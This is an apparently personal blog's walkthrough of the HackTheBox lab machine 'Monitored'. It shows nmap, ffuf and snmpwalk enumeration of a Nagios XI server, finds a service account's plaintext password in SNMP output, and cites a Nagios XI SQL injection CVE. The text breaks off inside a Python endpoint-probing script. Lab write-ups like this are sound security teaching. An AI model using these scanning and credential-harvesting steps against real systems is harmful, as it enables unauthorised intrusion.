<!DOCTYPE html>
<html>
<head>
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GX2L7MWQLN"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-GX2L7MWQLN');
</script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">
  <script>
    window.MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      }
    };
  </script>
  
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
  <style>
          .MathJax {
  font-size: 180%; /* Adjust the percentage as needed */
}
  </style>

  <title>Monitored - HackTheBox</title>

  <link rel="stylesheet" href="/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Monitored - HackTheBox | Cecil Daemon’s Wish</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Monitored - HackTheBox" />
<meta name="author" content="J. Alex Buschinelli" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction" />
<meta property="og:description" content="Introduction" />
<link rel="canonical" href="http://localhost:4000/monitored-htb" />
<meta property="og:url" content="http://localhost:4000/monitored-htb" />
<meta property="og:site_name" content="Cecil Daemon’s Wish" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-01-16T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Monitored - HackTheBox" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J. Alex Buschinelli","url":"https://alexbsec.github.io/"},"dateModified":"2024-01-16T00:00:00+00:00","datePublished":"2024-01-16T00:00:00+00:00","description":"Introduction","headline":"Monitored - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/monitored-htb"},"url":"http://localhost:4000/monitored-htb"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <div style="display: flex; justify-content: center; align-items: center; text-decoration: none;">
      <a href="/" style="display: flex; align-items: center; text-decoration: none;">
          <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
          
          
          <h1>cecil@celestial:/monitored-htb $</h1>
      
      </a>
  </div>
  <br>
    </a>
    <div class="header-links">
      <a href="/"><h2 class="header-link">Home</h2></a>
<a href="/archive"><h2 class="header-link">Archive</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>
<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>Monitored - HackTheBox</h2>
  <time datetime="2024-01-16T00:00:00+00:00" class="by-line">16 Jan 2024</time>
  <p>Estimated read time: 24 minutes</p>
  <h1 id="introduction"><a href="#intro"></a>Introduction</h1>

<p>In today’s post, we will be solving Season’s 4 second machine, Monitored. This is a medium difficulty machine full of rabbit
holes, so we need to pay attention to its environment in order to solve it. Let’s jump right into it!</p>

<h1 id="approach-mindset"><a href="#approach"></a>Approach mindset</h1>

<p>For our approach mindset, we shall separate it as the following steps:</p>

<ol>
  <li>Reconnaissance</li>
  <li>Getting foothold</li>
  <li>System enumeration</li>
  <li>Privilege escalation</li>
</ol>

<h2 id="step-1---reconnaissance"><a href="#step1-recon"></a>Step 1 - Reconnaissance</h2>

<p>We start by enumerating the system’s ports in order to get a feeling of what is running:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-A</span> <span class="nt">-oN</span> ports.nmap 10.129.37.231
Nmap scan report <span class="k">for </span>10.129.37.231
Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65530 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff <span class="o">(</span>RSA<span class="o">)</span>
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http       Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 <span class="o">((</span>Debian<span class="o">))</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nagios.monitored.htb/organizationName<span class="o">=</span>Monitored/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
|_http-title: Nagios XI
5667/tcp open  tcpwrapped
No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
TCP/IP fingerprint:
OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.94%E<span class="o">=</span>4%D<span class="o">=</span>1/15%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>30330%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>65A56AA
OS:8%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>102%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>9<span class="o">)</span>SEQ
OS:<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>102%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M53CST11NW7%O2<span class="o">=</span>M53CST11
OS:NW7%O3<span class="o">=</span>M53CNNT11NW7%O4<span class="o">=</span>M53CST11NW7%O5<span class="o">=</span>M53CST11NW7%O6<span class="o">=</span>M53CST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FE8
OS:8%W2<span class="o">=</span>FE88%W3<span class="o">=</span>FE88%W4<span class="o">=</span>FE88%W5<span class="o">=</span>FE88%W6<span class="o">=</span>FE88<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>FAF0%O<span class="o">=</span>M53
OS:CNNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span>
OS:R<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F
OS:<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T
OS:<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RI
OS:D<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>

Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   131.38 ms 10.10.14.1
2   131.45 ms 10.129.37.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon Jan 15 17:26:00 2024 -- 1 IP address (1 host up) scanned in 115.23 seconds</span>
</code></pre></div></div>

<p>From this, we find a bunch of services, but none of them are very interesting besides the web page. To access the web service,
we need to add the line <code class="language-plaintext highlighter-rouge">&lt;machine-ip&gt; nagios.monitored.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. After that, we can access it with our browser:</p>

<p><img src="../figs/monitored1.png" alt="landing page" /></p>

<p>If we click on “Access Nagios”, we will be brought to a login page, at <code class="language-plaintext highlighter-rouge">/nagiosxi/login.php</code>. I’ve tried to brute-force it and
send send SQL injection payloads, but that did not work. We know that this service is called Nagios XI, so my next step was to
look for common vulnerabilities revolving around this service. Upon a quick search, we find <a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/">this</a> blog about Nagios XI CVEs. One that stands out to me is the first one, CVE-2023-40931. It reads:</p>

<blockquote>
  <p>Nagios XI features “Announcement Banners”, which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack.</p>

  <p>When a user acknowledges a banner, a POST request is sent to <code class="language-plaintext highlighter-rouge">/nagiosxi/admin/banner_message-ajaxhelper.php</code> with the POST data consisting of the intended action and message ID – <code class="language-plaintext highlighter-rouge">action=acknowledge banner message&amp;id=3</code>.</p>

  <p>The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the <code class="language-plaintext highlighter-rouge">xi_session</code> and <code class="language-plaintext highlighter-rouge">xi_users</code> table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.</p>
</blockquote>

<p>As we can see, this vulnerability seems plausible, but we need a way in, since it only works if we have at least
access to a low privileged user.</p>

<p>I’ve ran <code class="language-plaintext highlighter-rouge">ffuf -u http://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code> to enumerate endpoints and this is what I’ve got:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">help</span>                    <span class="o">[</span>Status: 301, Size: 338, Words: 20, Lines: 10, Duration: 139ms]
mobile                  <span class="o">[</span>Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 136ms]
images                  <span class="o">[</span>Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 137ms]
about                   <span class="o">[</span>Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 135ms]
admin                   <span class="o">[</span>Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 129ms]
reports                 <span class="o">[</span>Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
includes                <span class="o">[</span>Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 130ms]
sounds                  <span class="o">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 134ms]
account                 <span class="o">[</span>Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
tools                   <span class="o">[</span>Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 132ms]
backend                 <span class="o">[</span>Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
config                  <span class="o">[</span>Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 134ms]
views                   <span class="o">[</span>Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 136ms]
db                      <span class="o">[</span>Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 137ms]
api                     <span class="o">[</span>Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 134ms]
terminal                <span class="o">[</span>Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 204ms]
</code></pre></div></div>

<p>The only interesting endpoint is <code class="language-plaintext highlighter-rouge">terminal</code>, which seems to be a terminal access to the server.</p>

<p><img src="../figs/monitored2.png" alt="terminal endpoint" /></p>

<p>However, this is not useful unless we have credentials to login.</p>

<p>We also see that there is an API endpoint, which might contain information disclosure or other ways in. However, after enumerating it, all I got was 403 status codes. Ok, let’s step back a little. We have found some interesting vectors, but we might need to 
find the credentials ourselves within the recon. According to Nagios XI documentation, it seems to be a network monitoring system. 
With a bit of research, we find <a href="https://www.nagios.com/solutions/snmp-monitoring/">this</a> page stating that Nagios XI provides complete monitoring of SNMP (Simple Network Message Protocol). SNMP runs on UDP port 161/162, and that was not shown on our first 
Nmap scan. This is because we have not specified it to perform a UDP scan. Let’s re-run Nmap with that in mind now:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">-T4</span> <span class="nt">-oN</span> udp.nmap 10.129.37.231
Warning: 10.129.37.231 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>nagios.monitored.htb <span class="o">(</span>10.129.37.231<span class="o">)</span>
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 984 closed udp ports <span class="o">(</span>port-unreach<span class="o">)</span>
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
123/udp   open          ntp
161/udp   open          snmp
162/udp   open|filtered snmptrap
3702/udp  open|filtered ws-discovery
16697/udp open|filtered unknown
16838/udp open|filtered unknown
17836/udp open|filtered unknown
21167/udp open|filtered unknown
34038/udp open|filtered unknown
37843/udp open|filtered unknown
40622/udp open|filtered unknown
41524/udp open|filtered unknown
43967/udp open|filtered unknown
54281/udp open|filtered unknown
65024/udp open|filtered unknown

<span class="c"># Nmap done at Mon Jan 15 18:09:22 2024 -- 1 IP address (1 host up) scanned in 1065.19 seconds</span>
</code></pre></div></div>

<p>As we can see, SNMP service is running on port 161. We can refer to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">this</a> HackTricks page about SNMP enumeration, which provides a good insight on how to use <code class="language-plaintext highlighter-rouge">snmpwalk</code>. This is what we can
run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>snmpwalk <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.129.37.231 system | <span class="nb">tee </span>snmpwalk.txt
SNMPv2-MIB::sysDescr.0 <span class="o">=</span> STRING: Linux monitored 5.10.0-27-amd64 <span class="c">#1 SMP Debian 5.10.205-2 (2023-12-31) x86_64</span>
SNMPv2-MIB::sysObjectID.0 <span class="o">=</span> OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance <span class="o">=</span> Timeticks: <span class="o">(</span>313660<span class="o">)</span> 0:52:16.60
SNMPv2-MIB::sysContact.0 <span class="o">=</span> STRING: Me &lt;root@monitored.htb&gt;
SNMPv2-MIB::sysName.0 <span class="o">=</span> STRING: monitored
SNMPv2-MIB::sysLocation.0 <span class="o">=</span> STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 <span class="o">=</span> INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 <span class="o">=</span> Timeticks: <span class="o">(</span>1581<span class="o">)</span> 0:00:15.81
SNMPv2-MIB::sysORID.1 <span class="o">=</span> OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 <span class="o">=</span> OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 <span class="o">=</span> OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 <span class="o">=</span> OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 <span class="o">=</span> OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 <span class="o">=</span> OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 <span class="o">=</span> OID: UDP-MIB::udpMIB
<span class="o">[</span>...snip...]
</code></pre></div></div>

<p>The output is huge and contains lots of information. After it finishes, we can use <code class="language-plaintext highlighter-rouge">grep</code> on <code class="language-plaintext highlighter-rouge">snmpwalk.txt</code> file to see
if we can find anything useful at all:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>snmpwalk.txt | <span class="nb">grep </span>password
<span class="nv">$ </span><span class="nb">cat </span>snmpwalk.txt | <span class="nb">grep </span>username
<span class="nv">$ </span><span class="nb">cat </span>snmpwalk.txt | <span class="nb">grep </span>user
HOST-RESOURCES-MIB::hrSWRunParameters.840 <span class="o">=</span> STRING: <span class="s2">"-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"</span>
HOST-RESOURCES-MIB::hrSWRunParameters.842 <span class="o">=</span> STRING: <span class="s2">"-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"</span>
HOST-RESOURCES-MIB::hrSWInstalledName.1 <span class="o">=</span> STRING: <span class="s2">"adduser_3.118+deb11u1_all"</span>
HOST-RESOURCES-MIB::hrSWInstalledName.812 <span class="o">=</span> STRING: <span class="s2">"xdg-user-dirs_0.17-2_amd64"</span>
</code></pre></div></div>

<p>The lines in the <code class="language-plaintext highlighter-rouge">| grep user</code> command show parameters for a running service or process. In this case, they seem to be related to shellinabox, a web-based terminal emulator. We can try to identify shell usage by greping <code class="language-plaintext highlighter-rouge">/bin/bash</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>snmpwalk.txt | <span class="nb">grep</span> /bin/bash
HOST-RESOURCES-MIB::hrSWRunPath.1383 <span class="o">=</span> STRING: <span class="s2">"/bin/bash"</span>
HOST-RESOURCES-MIB::hrSWRunParameters.588 <span class="o">=</span> STRING: <span class="s2">"-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1382 <span class="o">=</span> STRING: <span class="s2">"-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"</span>
</code></pre></div></div>

<p>We can see that the STRING parameter seems to be setting a user <code class="language-plaintext highlighter-rouge">svc</code> to run the command <code class="language-plaintext highlighter-rouge">check_host.sh</code> passing the username <code class="language-plaintext highlighter-rouge">svc</code> and what it seems to be a password <code class="language-plaintext highlighter-rouge">XjH7VCehowpR1xZB</code>. We can try to login with these credentials at <code class="language-plaintext highlighter-rouge">/nagiosxi/login.php</code> 
web service endpoint, but this will give</p>

<p><img src="../figs/monitored3.png" alt="failed login attempt" /></p>

<p>However, if we attempt to login with the username <code class="language-plaintext highlighter-rouge">svc</code> and a wrong password, the error message is different:</p>

<p><img src="../figs/monitored4.png" alt="failed login attempt 2" /></p>

<p>Indicating that the password found on SNMP protocol is correct, but the login of <code class="language-plaintext highlighter-rouge">svc</code> is disabled (at least in this endpoint).</p>

<h2 id="step-2---getting-foothold"><a href="#step3-foothold"></a>Step 2 - Getting foothold</h2>

<p>Back to square one, we need another way to authenticate. After reading lots of documentations, I’ve found that Nagios XI uses API Keys for user to perform actions within it. If that is the case, we might find a way to retrieve <code class="language-plaintext highlighter-rouge">svc</code> API key or token by authenticating somewhere else. Let’s try to find an API endpoint where we can authenticate ourselves. To do that, we’ll use <code class="language-plaintext highlighter-rouge">ffuf</code> again, but now at the <code class="language-plaintext highlighter-rouge">/nagiosxi/api</code> endpoint we found earlier.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://10.129.37.231/nagiosxi/api/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

v1                      [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 133ms]
:: Progress: [175/175] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
</span></code></pre></div></div>

<p>Accessing <code class="language-plaintext highlighter-rouge">/nagiosxi/api/v1</code> gives us a message <code class="language-plaintext highlighter-rouge">error	"No request was made"</code>, indicating this is a v1 API. Now, we run <code class="language-plaintext highlighter-rouge">ffuf</code> again, but with this new endpoint:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

authtoken               [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 262ms]
3.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 267ms]
7.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 274ms]
accounts                [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 278ms]
0                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 276ms]
1.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 276ms]
9                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 280ms]
all                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 297ms]
billing                 [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 293ms]
8.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 299ms]
1                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 248ms]
2                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 264ms]
bugs                    [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 240ms]
4.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 255ms]
3                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 257ms]
[...snip...]
</span></code></pre></div></div>

<p>All of them giving a 200 status code indicates the server is just sending us some messages about the request. We need more info about the messages the server is sending back to us. For that, let’s run <code class="language-plaintext highlighter-rouge">ffuf</code> in silent mode and redirect the output to <code class="language-plaintext highlighter-rouge">api-endpoints.txt</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt <span class="nt">-s</span> <span class="o">&gt;</span> api-endpoints.txt
</code></pre></div></div>

<p>Note that most of them gives the same message: <code class="language-plaintext highlighter-rouge">Message {"error":"No API Key provided"}</code>. That being noted, we will write a python script to see if there is any other messages within these:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">urllib3</span>

<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">open_wordlist</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">wordlist</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
            <span class="n">wordlist</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">wordlist</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">wordlist_file</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">wordlist</span> <span class="o">=</span> <span class="nf">open_wordlist</span><span class="p">(</span><span class="n">wordlist_file</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">word</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="k">if</span> <span class="sh">'</span><span class="s">No API Key provided</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Message </span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s"> at endpoint </span><span class="si">{</span><span class="n">url</span><span class="o">+</span><span class="n">word</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">argv</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: fetch-req-msg.py &lt;URL&gt; &lt;WORDLIST&gt;</span><span class="sh">"</span><span class="p">)</span>
